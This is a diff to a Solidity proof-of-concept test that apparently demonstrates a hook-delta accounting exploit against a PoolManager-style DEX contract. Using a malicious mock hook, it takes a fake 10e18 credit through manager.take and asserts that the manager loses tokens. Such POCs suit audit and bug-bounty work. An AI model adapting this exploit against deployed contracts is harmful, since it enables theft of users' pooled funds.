@@ -8,7 +8,7 @@ import {Hooks} from "../src/libraries/Hooks.sol";
 import {TickMath} from "../src/libraries/TickMath.sol";
 import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
 import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
-import {BalanceDelta, BalanceDeltaLibrary} from "../src/types/BalanceDelta.sol";
+import {BalanceDelta} from "../src/types/BalanceDelta.sol";
 
 contract Token {
     mapping(address=>uint) public balanceOf;
@@ -19,7 +19,6 @@ contract Token {
 }
 
 contract POC is Test {
-    using BalanceDeltaLibrary for BalanceDelta;
     PoolManager public manager;
     MaliciousDeltaHook public hook;
     Token public token0; Token public token1;
@@ -34,6 +33,7 @@ contract POC is Test {
         address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
         vm.etch(a, address(new MaliciousDeltaHook(address(manager))).code);
         hook=MaliciousDeltaHook(a);
+        vm.store(address(hook), bytes32(uint256(0)), bytes32(uint256(uint160(address(manager)))));
         token0.mint(address(this),1000e18); token1.mint(address(this),1000e18);
         token0.mint(address(manager),1000e18); token1.mint(address(manager),1000e18);
         key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
@@ -55,14 +55,12 @@ contract POC is Test {
             if(d.amount1()>0) manager.take(c1, address(this), uint128(d.amount1()));
         } else {
             BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            console.logInt(s.amount0());
-            console.logInt(s.amount1());
             if(s.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-s.amount0())); manager.settle();}
             if(s.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-s.amount1())); manager.settle();}
             if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
             if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
-            // THE EXPLOIT - use the hook's drain function, it knows the right currency
-            hook.drain(10e18);
+            // EXPLOIT: take hook's fake 10e18 credit - DO NOT USE hook.drain()
+            manager.take(c1, address(this), 10e18);
         }
         return "";
     }
@@ -71,7 +69,7 @@ contract POC is Test {
         uint bBefore = token1.balanceOf(address(manager));
         manager.unlock(abi.encode(uint256(2)));
         uint bAfter = token1.balanceOf(address(manager));
-        console.log("LOSS:", bBefore - bAfter);
+        console.log("MANAGER LOSS:", bBefore - bAfter);
         assertLt(bAfter, bBefore);
     }
 }
